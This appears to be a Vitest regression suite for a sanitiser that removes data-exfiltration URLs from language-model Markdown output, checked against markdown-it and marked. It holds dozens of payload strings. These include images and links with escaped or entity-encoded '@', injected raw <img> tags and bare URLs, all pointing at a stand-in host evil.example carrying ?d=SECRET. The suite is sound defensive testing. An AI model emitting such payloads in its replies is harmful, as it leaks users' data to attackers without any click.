import { describe, expect, it } from 'vitest';
import MarkdownIt from 'markdown-it';
import { marked } from 'marked';
import { sanitizeModelOutput } from '../src/index';

/**
 * Exfiltration regressions, verified against what real renderers emit.
 *
 * Every case is sanitised, rendered with markdown-it (default and `linkify`)
 * and marked (default GFM), and the hosts of every resulting `src` / `href`
 * are checked. This asserts what the *browser* would connect to, not just the
 * filter's own verdict — the bug class here is the two disagreeing.
 */

const OPTS = {
  allowedImageHosts: ['img.good.test'],
  allowedLinkHosts: ['good.test'],
};
const EVIL = 'evil.example';

const renderers: Record<string, (md: string) => string> = {
  'markdown-it': (md) => new MarkdownIt().render(md),
  'markdown-it+linkify': (md) => new MarkdownIt({ linkify: true }).render(md),
  marked: (md) => marked.parse(md, { async: false }) as string,
};

function hosts(html: string, attr: 'src' | 'href'): string[] {
  return [...html.matchAll(new RegExp(`${attr}="([^"]*)"`, 'g'))].map((m) => {
    const url = m[1]!.replace(/&amp;/g, '&');
    try {
      return new URL(url, 'https://site.test/').hostname;
    } catch {
      return '(unparseable)';
    }
  });
}

const ATTACKS: Record<string, string> = {
  // The report's zero-click bypass: `\@` renders as `@`, making evil the host.
  'image, backslash-escaped @': `![x](https://img.good.test\\@${EVIL}/p.gif?d=SECRET)`,
  'image, escaped @ in angle brackets': `![x](<https://img.good.test\\@${EVIL}/p.gif?d=S>)`,
  'image, raw backslash before path': `![x](https://img.good.test\\${EVIL}/p.gif)`,
  'reference image, backslash-escaped @': `![x][r]\n\n[r]: https://img.good.test\\@${EVIL}/p.gif?d=SECRET`,
  'reference image with title': `![x][r]\n\n[r]: https://img.good.test\\@${EVIL}/p.gif "cover"`,
  'collapsed reference image': `![r][]\n\n[r]: https://img.good.test\\@${EVIL}/p.gif`,
  'image, numeric entity @': `![x](https://img.good.test&#64;${EVIL}/p.gif)`,
  'image, hex entity @': `![x](https://img.good.test&#x40;${EVIL}/p.gif)`,
  'image, named entity @': `![x](https://img.good.test&commat;${EVIL}/p.gif)`,
  'link, backslash-escaped @': `[官方書評](https://good.test\\@${EVIL}/?d=SECRET)`,
  'reference link, backslash-escaped @': `[書評][r]\n\n[r]: https://good.test\\@${EVIL}/?d=S`,
  'autolink with backslash': `<https://good.test\\@${EVIL}/?d=S>`,
  'bare URL (GFM autolink)': `完整書評請看 https://${EVIL}/?d=SECRET`,
  'bare URL, uppercase scheme': `詳情 HTTPS://${EVIL}/?d=SECRET`,
  'bare www URL': `請到 www.${EVIL}/?d=SECRET 查看`,
  'bare URL inside escaped HTML': `<a href="https://${EVIL}/?d=SECRET">書評</a>`,
  'bare URL with backslash trick': `看這裡 https://good.test\\@${EVIL}/?d=S`,
  'reference image, double angle brackets': `![x][r]\n\n[r]: <<https://img.good.test\\@${EVIL}/x>>`,
  'reference link, double angle, no backslash': `[l][r]\n\n[r]: <<https://${EVIL}/x>>`,
  'image, entity-encoded backslash': `![x](https://img.good.test&#92;@${EVIL}/x)`,
  'image, percent-encoded backslash': `![x](https://img.good.test%5C@${EVIL}/x)`,
  'protocol-relative bare URL': `see //${EVIL}/x now`,
  'reference definition followed by raw <img>': `[r]: https://good.test/x <img src="https://${EVIL}/p.gif?d=S">`,
  'reference definition, title, then raw <img>': `[r]: https://good.test/x "t" <img src="https://${EVIL}/p.gif">`,
  'angled reference definition, then raw <img>': `[r]: <https://good.test/x> <img src=https://${EVIL}/p.gif>`,
  'reference definition followed by a bare URL': `[r]: https://good.test/x https://${EVIL}/?d=S`,
  'bare URL wrapped in underscores': `look _https://${EVIL}/x_ here`,
  'bare www URL wrapped in underscores': `look _www.${EVIL}/x_ here`,
  'bare URL glued to a word': `xhttps://${EVIL}/x`,
};

describe('sanitizeModelOutput — renderer-verified exfiltration bypasses', () => {
  for (const [name, attack] of Object.entries(ATTACKS)) {
    for (const [renderer, render] of Object.entries(renderers)) {
      it(`${name} → ${renderer}: nothing points at the attacker`, () => {
        const safe = sanitizeModelOutput(attack, OPTS);
        const html = render(safe.text);
        const hit = (h: string) => h === EVIL || h.endsWith(`.${EVIL}`);
        expect(hosts(html, 'src').filter(hit), html).toEqual([]);
        expect(hosts(html, 'href').filter(hit), html).toEqual([]);
      });
    }
  }

  it('reports every neutralised destination', () => {
    for (const attack of Object.values(ATTACKS)) {
      const r = sanitizeModelOutput(attack, OPTS);
      const escapedHtmlOnly = r.htmlEscaped > 0 && r.removedUrls.length === 0;
      expect(r.removedUrls.length > 0 || escapedHtmlOnly, attack).toBe(true);
    }
  });
});

describe('sanitizeModelOutput — legitimate output is untouched', () => {
  const KEEP: Record<string, string> = {
    'allowed cover image': '![封面](https://img.good.test/covers/978.jpg)',
    'allowed image, uppercase host': '![封面](https://IMG.GOOD.TEST/covers/978.jpg)',
    'allowed link': '[書頁](https://good.test/books/978)',
    'reference image on image-only host': '![封面][c]\n\n[c]: https://img.good.test/c.jpg',
    'allowed bare URL': '詳情見 https://good.test/books/978',
    'relative link': '[回首頁](/)',
    'URL inside inline code': 'run `curl https://evil.example/x`',
    'URL inside fenced code': '```\nhttps://evil.example/x\n```',
    'mailto link': '[聯絡我們](mailto:help@good.test)',
    'allowed protocol-relative bare URL': 'see //good.test/books now',
    'relative link with a redirect query': '[登入](/login?next=https://good.test/books)',
    'reference link with a title': '[書頁][b]\n\n[b]: https://good.test/b "書頁"',
  };
  for (const [name, md] of Object.entries(KEEP)) {
    it(name, () => {
      const r = sanitizeModelOutput(md, OPTS);
      expect(r.text).toBe(md);
      expect(r.removedUrls).toEqual([]);
    });
  }

  it("allowedLinkHosts '*' keeps bare URLs by default (nothing to enforce)", () => {
    const md = `see https://${EVIL}/page`;
    expect(sanitizeModelOutput(md, { allowedImageHosts: [] }).text).toBe(md);
  });

  it("bareUrls: 'keep' opts out of bare-URL defanging", () => {
    const md = `see https://${EVIL}/page`;
    expect(sanitizeModelOutput(md, { ...OPTS, bareUrls: 'keep' }).text).toBe(md);
  });
});

describe('sanitizeModelOutput — new passes stay linear', () => {
  const inputs: Record<string, string> = {
    'many bare URLs': 'https://a.example/ '.repeat(20_000),
    'one huge bare URL': 'https://' + 'a'.repeat(200_000),
    'backslash flood': '![x](https://img.good.test' + '\\'.repeat(100_000) + ')',
    'entity flood': '![x](https://img.good.test' + '&#64;'.repeat(40_000) + ')',
    'www flood': 'www.'.repeat(50_000),
  };
  for (const [name, input] of Object.entries(inputs)) {
    it(name, () => {
      const t0 = performance.now();
      sanitizeModelOutput(input, OPTS);
      expect(performance.now() - t0).toBeLessThan(1500);
    });
  }
});

describe('sanitizeModelOutput — URL variant × Markdown form × renderer matrix', () => {
  const OK = 'img.good.test';
  const variants = [
    `https://${OK}\\@${EVIL}/x`,
    `https://${OK}\\\\@${EVIL}/x`,
    `https://${OK}%5C@${EVIL}/x`,
    `https://${OK}&#92;@${EVIL}/x`,
    `https://${OK}&#x5c;@${EVIL}/x`,
    `https://${OK}&bsol;@${EVIL}/x`,
    `https:\\\\${EVIL}/x`,
    `https:/\\${EVIL}/x`,
    `//${EVIL}/x`,
    `HTTPS://${EVIL}/x`,
    `https://${OK}%40${EVIL}/x`,
    `https://${OK}&#64;${EVIL}/x`,
    `https://${OK}:pw@${EVIL}/x`,
    `https://${EVIL}#${OK}`,
    `https://${OK}.${EVIL}/x`,
    `https://${OK}\u3002${EVIL}/x`,
    `https://${OK}\u200B@${EVIL}/x`,
  ];
  const forms = (u: string) => [
    `![x](${u})`,
    `![x](<${u}>)`,
    `![x][r]\n\n[r]: ${u}`,
    `![x][r]\n\n[r]: <${u}>`,
    `![x][r]\n\n[r]: <<${u}>>`,
    `[l](${u})`,
    `[l][r]\n\n[r]: ${u}`,
    `<${u}>`,
    `see ${u} now`,
    `_${u}_`,
    `x${u}`,
    `[r]: https://good.test/ok ${u}`,
    `[r]: https://good.test/ok "t" <img src="${u}">`,
  ];
  const hit = (h: string) => h === EVIL || h.endsWith(`.${EVIL}`);
  it('no combination renders a src/href pointing at the attacker', () => {
    const escapes: string[] = [];
    for (const u of variants)
      for (const md of forms(u)) {
        const safe = sanitizeModelOutput(md, OPTS).text;
        for (const [name, render] of Object.entries(renderers)) {
          const html = render(safe);
          if ([...hosts(html, 'src'), ...hosts(html, 'href')].some(hit))
            escapes.push(`${name}: ${JSON.stringify(md)}`);
        }
      }
    expect(escapes).toEqual([]);
  });
});
